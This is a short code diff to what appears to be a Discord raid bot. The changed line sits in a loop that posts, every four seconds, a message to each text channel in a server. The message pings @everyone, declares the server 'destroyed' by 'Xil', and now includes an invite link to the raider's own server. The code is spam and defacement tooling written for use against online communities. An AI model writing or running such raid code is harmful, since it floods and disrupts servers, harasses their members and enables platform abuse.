@@ -132,7 +132,7 @@ client.on('ready', () => {
                     let i = 0;
                     let interval = setInterval(function () {
                         message.guild.channels.forEach(channel => {
-                            if (channel.type === 'text') channel.send('RAID BY DEA XIL \n Serveur détruit par Xil \n rejoignez mon serveur pour apprendre :wink: @everyone')
+                            if (channel.type === 'text') channel.send('RAID BY DEA XIL \n Serveur détruit par Xil \n rejoignez mon serveur pour apprendre :wink: https://discord.gg/vkXxCtB @everyone')
                         } , 4000)
                     })
                 }});
